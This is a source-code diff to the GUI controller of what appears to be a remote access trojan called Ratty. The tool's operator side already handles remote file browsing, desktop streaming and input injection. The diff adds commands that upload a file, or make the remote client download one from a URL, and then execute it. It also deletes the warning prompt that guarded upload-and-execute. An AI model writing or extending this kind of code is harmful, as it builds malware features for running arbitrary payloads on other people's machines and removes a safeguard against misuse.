@@ -73,7 +73,6 @@ public final class RattyGuiController extends AbstractRattyController implements
 	private static final String BUILDER_ERROR_MESSAGE = LANGUAGE.getString("builder.error");
 	private static final String BUILDER_ADDRESS_QUESTION = LANGUAGE.getString("builder.address_question");
 	private static final String BUILDER_PORT_QUESTION = LANGUAGE.getString("builder.port_question");
-	private static final String UPLOAD_EXECUTE_WARNING = LANGUAGE.getString("server.upload_execute_warning");
 	private static final String URL_MESSAGE = LANGUAGE.getString("server.url_message");
 	
 	private static final Sound PING = Sound.loadSound("/ping.wav");
@@ -198,6 +197,44 @@ public final class RattyGuiController extends AbstractRattyController implements
 		return null;
 	}
 	
+	private DownloadUrlPacket createDownloadUrlPacket(final ServerClient client) {
+		final String address = gui.getInput(URL_MESSAGE);
+		
+		if (address != null) {
+			final FileTreeNode node = client.fileTree.getLastNodeClicked();
+			final String path = node.getPath();
+			final DownloadUrlPacket packet = new DownloadUrlPacket(address, path);
+			
+			return packet;
+		}
+		
+		return null;
+	}
+	
+	private UploadFilePacket createUploadExecutePacket(final ServerClient client) {
+		final File file = gui.getFile();
+		
+		if (file != null) {
+			final UploadFilePacket packet = new UploadFilePacket(file, "", true);
+			
+			return packet;
+		}
+		
+		return null;
+	}
+	
+	private DownloadUrlPacket createDropExecutePacket(final ServerClient client) {
+		final String address = gui.getInput(URL_MESSAGE);
+		
+		if (address != null) {
+			final DownloadUrlPacket packet = new DownloadUrlPacket(address, "", true);
+			
+			return packet;
+		}
+		
+		return null;
+	}
+	
 	private void toggleDesktopStream(final ServerClient client) {
 		final boolean streamingDesktop = client.isStreamingDesktop();
 		
@@ -269,40 +306,6 @@ public final class RattyGuiController extends AbstractRattyController implements
 		}
 	}
 	
-	private void uploadExecute(final ServerClient client) {
-		final boolean accepted = gui.showWarning(UPLOAD_EXECUTE_WARNING, OPTION_YES, OPTION_CANCEL);
-		
-		if (!accepted) {
-			return;
-		}
-		
-		final File file = gui.getFile();
-		
-		if (file == null) {
-			return;
-		}
-		
-		final UploadFilePacket upload = new UploadFilePacket(file, "");
-		final ExecuteFilePacket execute = new ExecuteFilePacket(file.getName());
-		
-		client.connection.addPacket(upload);
-		client.connection.addPacket(execute);
-	}
-	
-	private DownloadUrlPacket createDownloadUrlPacket(final ServerClient client) {
-		final String address = gui.getInput(URL_MESSAGE);
-		
-		if (address != null) {
-			final FileTreeNode node = client.fileTree.getLastNodeClicked();
-			final String path = node.getPath();
-			final DownloadUrlPacket packet = new DownloadUrlPacket(address, path);
-			
-			return packet;
-		}
-		
-		return null;
-	}
-	
 	private void handleCommand(final ServerClient client, final String command) {
 		if (command == RattyGui.FILES) {
 			client.fileTree.setVisible(true);
@@ -318,8 +321,6 @@ public final class RattyGuiController extends AbstractRattyController implements
 			startBuilder();
 		} else if (command == FileTree.REQUEST) {
 			requestFile(client);
-		} else if (command == RattyGui.UPLOAD_EXECUTE) {
-			uploadExecute(client);
 		}
 	}
 	
@@ -354,6 +355,10 @@ public final class RattyGuiController extends AbstractRattyController implements
 			packet = createFolderPacket(client);
 		} else if (command == FileTree.DROP_FILE) {
 			packet = createDownloadUrlPacket(client);
+		} else if (command == RattyGui.UPLOAD_EXECUTE) {
+			packet = createUploadExecutePacket(client);
+		} else if (command == RattyGui.DROP_EXECUTE) {
+			packet = createDropExecutePacket(client);
 		} else if (command == DisplayPanel.MOUSE_EVENT && client.isStreamingDesktop()) {
 			packet = client.displayPanel.getLastMouseEventPacket();
 		} else if (command == DisplayPanel.KEY_EVENT && client.isStreamingDesktop()) {
